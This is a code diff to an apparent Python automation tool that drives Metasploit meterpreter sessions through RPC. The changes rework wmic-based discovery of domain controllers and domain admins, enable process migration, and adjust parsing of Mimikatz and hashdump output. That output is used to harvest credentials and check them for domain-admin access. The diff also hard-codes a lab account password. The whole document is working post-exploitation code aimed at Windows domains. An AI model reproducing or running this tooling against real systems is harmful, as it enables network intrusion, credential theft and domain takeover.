@@ -57,7 +57,7 @@ def print_great(msg, label, num):
     if num:
         print(colored('[!] ', 'yellow', attrs=['bold']) + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
     else:
-        print(colored('[!] ', 'yellow') + msg)
+        print(colored('[!] ', 'yellow', attrs=['bold']) + msg)
 
 def print_debug(msg, label, num):
     if num:
@@ -222,10 +222,7 @@ async def sess_first_check(lock, client, sess_num, sess_data, domain_data):
         ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
         ip_data = b'IP              : '+ip
 
-
-        # Migrate out of the process
-        # Not sure we want this as it'll migrate a domain user with local admin shell into SYSTEM
-        #await run_priv_migrate(client, sess_num)
+        print_good('Gathering shell info'.format(sess_num_str), 'Session', sess_num)
 
         shell_info = await get_shell_info(client, sess_num, sess_data)
         if shell_info == [b'ERROR']:
@@ -235,37 +232,58 @@ async def sess_first_check(lock, client, sess_num, sess_data, domain_data):
         # Get shell privileges
         admin_shell, local_admin = await check_privs(client, sess_num, sess_data)
 
-        # Get session domain from shell info
-        domain = get_domain(shell_info)
-        sess_data[sess_num][b'domain'] = domain
-        sess_data[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)
+#        # Get session domain from shell info
+        #domain = get_domain(shell_info)
+        #sess_data[sess_num][b'domain'] = domain
+        #sess_data[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)
 
         # Update domain_data for domain admins and domain controllers
-        await make_session_busy(sess_num, sess_data)
-        await start_shell(client, sess_num, sess_data)
-
-        domains_and_DCs = await get_domains_and_DCs(lock, client, sess_num, sess_data)
-        domain_data['domains'].update(domains_and_DCs)
-        for dom in domains_and_DCs:
-            print_info('Domain and controllers: {}'.format(dom), 'Session', sess_num)
-            for DC in domains_and_DCs[dom]:
-                print('                            '+DC)
-        DAs = await get_domain_admins(lock, client, sess_num, sess_data, domain_data)
-        for da in DAs:
-            print_info('Domain admin: '+da, 'Session', sess_num)
-        domain_data['domain_admins'] = DAs
-
-        await end_shell(lock, client, sess_num, sess_data)
-        make_session_not_busy(sess_num, sess_data)
+        await domain_recon(lock, client, sess_num, sess_data, domain_data)
 
         # Check if it's a shell on a DC
-        all_DCs = await combine_DCs(lock, domain_data)
-        if ip.decode('utf8') in all_DCs and admin_shell == b'True':
+        if ip.decode('utf8') in domain_data['domain_controllers'] and admin_shell == b'True':
             print_great('Admin shell on domain controller acquired!', 'Session', sess_num)
 #            end_script()
 
         # Print the new shell's data
         print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)
+
+        # Migrate out of the process
+        await run_priv_migrate(client, sess_num, sess_data)
+
+async def domain_recon(lock, client, sess_num, sess_data, domain_data):
+
+    sess_num_str = str(sess_num)
+    print_info('Performing domain recon with wmic'.format(sess_num_str), 'Session', sess_num)
+    await make_session_busy(sess_num, sess_data)
+    await start_shell(client, sess_num, sess_data)
+
+    # Update sess_data and domain_data
+    domains_and_DCs = await get_domains_and_DCs(lock, client, sess_num, sess_data)
+    if domains_and_DCs:
+        for dom in domains_and_DCs:
+            print_info('Domain and controllers: {}'.format(dom), 'Session', sess_num)
+            for DC in domains_and_DCs[dom]:
+                print('                                          '+DC)
+
+            if dom in sess_data[sess_num]:
+                sess_data[sess_num][b'domain'].append(dom)
+            else:
+                sess_data[sess_num][b'domain'] = [dom]
+        domain_data['domains'].update(domains_and_DCs)
+
+    # Update master list of DCs
+    all_DCs = await combine_DCs(lock, domain_data)
+    domain_data['domain_controllers'] = all_DCs
+
+    # Get DAs
+    DAs = await get_domain_admins(lock, client, sess_num, sess_data, domain_data)
+    for da in DAs:
+        print_info('Domain admin: '+da, 'Session', sess_num)
+    domain_data['domain_admins'] = DAs
+
+    await end_shell(lock, client, sess_num, sess_data)
+    make_session_not_busy(sess_num, sess_data)
 
 async def combine_DCs(lock, domain_data):
     all_DCs = []
@@ -335,16 +353,16 @@ def parse_pid(output, user, proc):
 #                    b'[+] Successfully migrated to']
 #        output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
 #
-#async def run_priv_migrate(client, sess_num):
-#    print_info('Migrating to similar privilege process', 'Session', sess_num)
-#    cmd = 'run post/windows/manage/priv_migrate'
-#    end_strs = [b'Migration completed successfully.',
-#                b'Session is already in target process',
-#                b'[+] Already in',
-#                b'[+] Successfully migrated to']
-#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
-#    if err:
-#        return err
+async def run_priv_migrate(client, sess_num, sess_data):
+    print_info('Migrating to similar privilege process', 'Session', sess_num)
+    cmd = 'run post/windows/manage/priv_migrate'
+    end_strs = [b'Migration completed successfully.',
+                b'Session is already in target process',
+                b'[+] Already in',
+                b'[+] Successfully migrated to']
+    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
+    if err:
+        return err
 
 async def check_privs(client, sess_num, sess_data):
 
@@ -404,7 +422,7 @@ async def host_to_ip(sess_num, host):
 async def start_shell(client, sess_num, sess_data):
     ''' start OS cmd prompt on a meterpreter session '''
     cmd = 'shell'
-    end_strs = [b'\\system32>']
+    end_strs = [b'>']
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
 
 async def end_shell(lock, client, sess_num, sess_data):
@@ -418,7 +436,7 @@ async def get_domains_and_DCs(lock, client, sess_num, sess_data):
 
     # Subshells must have newline
     cmd = 'wmic NTDOMAIN GET DomainControllerAddress,DomainName /VALUE\n'
-    end_strs = [b'\\system32>']
+    end_strs = ([b'>'], 2)
 
     output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
     if err:
@@ -431,8 +449,7 @@ async def get_domains_and_DCs(lock, client, sess_num, sess_data):
     return domains_and_DCs
 
 def parse_domain_wmic(output):
-    ''' 
-    Example output:
+    ''' Example output:
 
     DomainControllerAddress=
     DomainName=
@@ -441,8 +458,8 @@ def parse_domain_wmic(output):
 
     DomainControllerAddress=\\192.168.243.129
     DomainName=LAB2
-    Roles=
-    '''
+    Roles= '''
+
     DC_str = 'DomainControllerAddress=\\\\'
     domain_str = 'DomainName='
     domains_and_DCs = {}
@@ -458,9 +475,9 @@ def parse_domain_wmic(output):
             if domain_str in l:
                 domain = l.split(domain_str)[1].lower()
                 if domain in domains_and_DCs:
-                    domains_and_DCs[domain] = [DC]
-                else:
                     domains_and_DCs[domain].append(DC)
+                else:
+                    domains_and_DCs[domain] = [DC]
 
             DC = None
 
@@ -499,22 +516,25 @@ def get_domain(shell_info):
 async def get_domain_admins(lock, client, sess_num, sess_data, domain_data):
     ''' Session is dropped into a cmd prompt prior to this function running '''
     print_info('Getting domain admins', 'Session', sess_num)
-    end_strs = [b'\\system32>']
+    end_strs = ([b'>'], 2)
 
     domain_admins = []
     domains = []
 
+    # Get domains
     with await lock:
         for domain in domain_data['domains']:
-            domains.append(domain)
+            domains.append(domain.lower())
 
     for domain in domains:
         # Subshells must have newlines in their commands
-        cmd = 'wmic path win32_groupuser where (groupcomponent="win32_group.name=\"domain admins\",domain=\"{}\"")\n'.format(domain)
+        cmd = 'wmic path win32_groupuser where (groupcomponent=\'win32_group.name="domain admins",domain="{}"\')\n'.format(domain)
+        await make_session_busy(sess_num, sess_data)
         output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
+        make_session_not_busy(sess_num, sess_data)
         if err:
             continue
-        DAs = parse_wmic_DA_out(output)
+        DAs = await parse_wmic_DA_out(output)
         domain_admins += DAs
 
     return domain_admins
@@ -529,10 +549,13 @@ async def parse_wmic_DA_out(output):
         if 'Win32_UserAccount.Domain' in l:
             l_split = l.split()
             # \\WIN10-2\root\cimv2:Win32_UserAccount.Domain="lab2",Name="Administrator"
-            part_component = l_split[1]
-            match = re.search('Name="(.*)"',part_component)
-            if match:
-                dom_user = domain+'\\'+match.group(1)
+            part_component = l_split[2]
+            re_user = re.search('Name="(.*?)"',part_component)
+            re_dom = re.search('Domain="(.*?)"',part_component)
+            if re_user and re_dom:
+                user = re_user.group(1)
+                dom = re_dom.group(1)
+                dom_user = dom+'\\'+user
                 DAs.append(dom_user)
 
     return DAs
@@ -607,7 +630,7 @@ async def run_mimikatz(lock, client, sess_num, sess_data, domain_data):
         if l.startswith(b'0;'):
             line_split = l.split(None, 4)
 
-            # Output may include accounts without a password?
+            # Output may include accounts without a password
             # Here's what I've seen that causes problems:
             #ob'AuthID        Package    Domain        User               Password'
             #b'------        -------    ------        ----               --------'
@@ -620,7 +643,7 @@ async def run_mimikatz(lock, client, sess_num, sess_data, domain_data):
                 continue
 
             dom = line_split[2].lower()
-            if dom.lower() == sess_data[sess_num][b'domain'].lower():
+            if dom.lower() in sess_data[sess_num][b'domain']:
                 dom_user = '{}\\{}'.format(dom.decode('utf8').lower(), line_split[3].decode('utf8'))
                 password = line_split[4]
 
@@ -633,7 +656,7 @@ async def run_mimikatz(lock, client, sess_num, sess_data, domain_data):
                     if creds not in domain_data['creds']:
                         domain_data['creds'].append(creds)
                         msg = 'Creds found through Mimikatz: '+creds
-                        print_great(msg, 'Session', sess_num)
+                        print_good(msg, 'Session', sess_num)
                         await check_for_DA(lock, client, creds, sess_num, domain_data)
 
 async def check_creds_against_DC(lock, client, sess_num, cred_data, domain_data):
@@ -672,7 +695,7 @@ async def check_for_DA(lock, client, creds, sess_num, domain_data):
 
     # Get a copy of domain_data['domain_admins']
     with await lock:
-        for x in domain_data['domains']:
+        for x in domain_data['domain_admins']:
             DAs.append(x)
 
     # Got a hash
@@ -688,13 +711,14 @@ async def check_for_DA(lock, client, creds, sess_num, domain_data):
         if user.lower() == 'administrator':
             return
 
-        for c in DAs:
-            da_user = c.split('\\')[1]
-            if user.lower() == da_user.lower():
-                dom = '.'
-                lm_ntlm = lm+':'+ntlm
-                cred_data = (dom, user, lm_ntlm)
-                break
+        if len(DAs) > 0:
+            for c in DAs:
+                da_user = c.split('\\')[1]
+                if user.lower() == da_user.lower():
+                    dom = '.'
+                    lm_ntlm = lm+':'+ntlm
+                    cred_data = (dom, user, lm_ntlm)
+                    break
 
     # plaintext
     else:
@@ -737,7 +761,7 @@ async def run_hashdump(lock, client, sess_num, sess_data, domain_data):
         if l not in domain_data['creds']:
             domain_data['creds'].append(l)
             msg = 'Hashdump creds - '+l
-            print_great(msg, 'Session', sess_num)
+            print_good(msg, 'Session', sess_num)
             await check_for_DA(lock, client, l, sess_num, domain_data)
 
 def get_console_ids(client):
@@ -789,7 +813,7 @@ async def run_console_cmd(client, c_id, cmd, end_strs):
 
     return (output, err)
 
-async def get_console_output(client, c_id, end_strs, timeout=240):
+async def get_console_output(client, c_id, end_strs, timeout=60):
     '''
     The only way to get console busy status is through console.read or console.list
     console.read clears the output buffer so you gotta use console.list
@@ -817,7 +841,6 @@ async def get_console_output(client, c_id, end_strs, timeout=240):
         output += client.call('console.read', [c_id])[b'data']
 
         if end_strs:
-            if type(end_strs) == tuple:
 
             if any(end_strs in output for end_strs in end_strs):
                 break
@@ -1054,7 +1077,7 @@ async def create_user_pwd_creds(lock, user, pwd, dom, domain_data):
     # PTH user
     else:
         with await lock:
-            for c in domain_data['checked_creds']:
+            for c in domain_data['creds']:
                 if user in c and pwd in c:
                     user_pwd = user+':'+pwd
                     creds = c
@@ -1209,7 +1232,7 @@ def get_output_errors(output, cmd):
 
     return err
 
-async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='run_single', timeout=240):
+async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='run_single', timeout=60):
 
     err = None
     output = None
@@ -1219,8 +1242,6 @@ async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='
     print_info('Running [{}]'.format(cmd.strip()), 'Session', sess_num)
 
     sess_data[sess_num][b'busy'] = b'True'
-    if 'wmic' in cmd:
-        embed()
 
     res = client.call('session.meterpreter_{}'.format(api_call), [str(sess_num), cmd])
 
@@ -1240,6 +1261,7 @@ async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='
         full_output = b''
 
         try:
+            num_es = 1
             while True:
                 await asyncio.sleep(sleep_secs)
 
@@ -1263,14 +1285,26 @@ async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='
                 # If no terminating string specified just wait til timeout
                 counter += sleep_secs
                 if counter > timeout:
-                    err = 'Command [{}] timed out'.format(cmd)
+                    err = 'Command [{}] timed out'.format(cmd.strip())
                     sess_data[sess_num][b'errors'].append(err)
                     print_bad(err, 'Session', sess_num)
                     break
 
-                # Successfully completed
+                # Successfully completed - this section can probably be cleaned up
                 if end_strs:
-                    if any(end_strs in full_output for end_strs in end_strs):
+                    # If we get a tuple as the end_strs then the second value is how many
+                    # times we need to hit that end_str before we complete
+                    if type(end_strs) == tuple:
+                        num_es = end_strs[1]
+                        end_strs = end_strs[0]
+
+                    #if any(end_strs in output for end_strs in end_strs):
+                    hit_es_limit = False
+                    for end_str in end_strs:
+                        if full_output.count(end_str) >= num_es:
+                            hit_es_limit = True
+                            break
+                    if hit_es_limit:
                         break
 
                 # If no end_strs specified just return once we have any data or until timeout
@@ -1345,12 +1379,11 @@ async def get_sessions(lock, client, domain_data, sess_data):
     print_waiting = True
     sleep_secs = 2
 
-    ### exists for potential debug purposes ##
+    ## exists for potential debug purposes ##
     counter = 0
     if counter > 30:
-    #    # Yes this is public information but just here for debugging
+        # Yes this is public information but just here for debugging
         domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
-    ##########################################
 
     while True:
         # Get list of MSF sessions from RPC server
@@ -1387,44 +1420,56 @@ async def get_sessions(lock, client, domain_data, sess_data):
 
         counter += 1 # here for potential debug purposes
 
-def parse_hostlist(domain_data):
+def parse_nmap_xml():
+    hosts = []
+    try:
+        report = NmapParser.parse_fromfile(args.xml)
+        for host in report.hosts:
+            if host.is_up():
+                for s in host.services:
+                    if s.port == 445:
+                        if s.state == 'open':
+                            host = host.address
+                            if host not in hosts:
+                                hosts.append(host)
+    except FileNotFoundError:
+        print_bad('Host file not found: {}'.format(args.xml), None, None)
+        sys.exit()
+
+    return hosts
+
+def parse_host_list():
+    hosts = []
+    try:
+        with open(args.hostlist, 'r') as hostlist:
+            host_lines = hostlist.readlines()
+            for line in host_lines:
+                line = line.strip()
+                try:
+                    if '/' in line:
+                        hosts += [str(ip) for ip in IPNetwork(line)]
+                    elif '*' in line:
+                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
+                        sys.exit()
+                    else:
+                        hosts.append(line)
+                except (OSError, AddrFormatError):
+                    print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
+                    sys.exit()
+    except FileNotFoundError:
+        print_bad(args.hostlist+' not found', None, None)
+        sys.exit()
+
+    return hosts
+
+def parse_hosts(domain_data):
     hosts = []
 
     if args.xml:
-        try:
-            report = NmapParser.parse_fromfile(args.xml)
-            for host in report.hosts:
-                if host.is_up():
-                    for s in host.services:
-                        if s.port == 445:
-                            if s.state == 'open':
-                                host = host.address
-                                if host not in hosts:
-                                    hosts.append(host)
-        except FileNotFoundError:
-            print_bad('Host file not found: {}'.format(args.xml), None, None)
-            sys.exit()
+        hosts = parse_nmap_xml()
 
     elif args.hostlist:
-        try:
-            with open(args.hostlist, 'r') as hostlist:
-                host_lines = hostlist.readlines()
-                for line in host_lines:
-                    line = line.strip()
-                    try:
-                        if '/' in line:
-                            hosts += [str(ip) for ip in IPNetwork(line)]
-                        elif '*' in line:
-                            print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
-                            sys.exit()
-                        else:
-                            hosts.append(line)
-                    except (OSError, AddrFormatError):
-                        print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
-                        sys.exit()
-        except FileNotFoundError:
-            print_bad(args.hostlist+' not found', None, None)
-            sys.exit()
+        hosts = parse_host_list()
 
     domain_data['hosts'] = hosts
 
@@ -1452,13 +1497,14 @@ def main():
                    'hosts':[]}
 
     if args.hostlist or args.xml:
-        parse_hostlist(domain_data)
+        parse_hosts(domain_data)
 
     try:
         client = get_perm_token(client)
     except:
         print_bad('Failed to connect to MSF RPC server,'
-                  'are you sure you have the right password?', None, None)
+                  ' are you sure metasploit is running and you have the right password?',
+                  None, None)
         sys.exit()
 
     c_ids = get_console_ids(client)
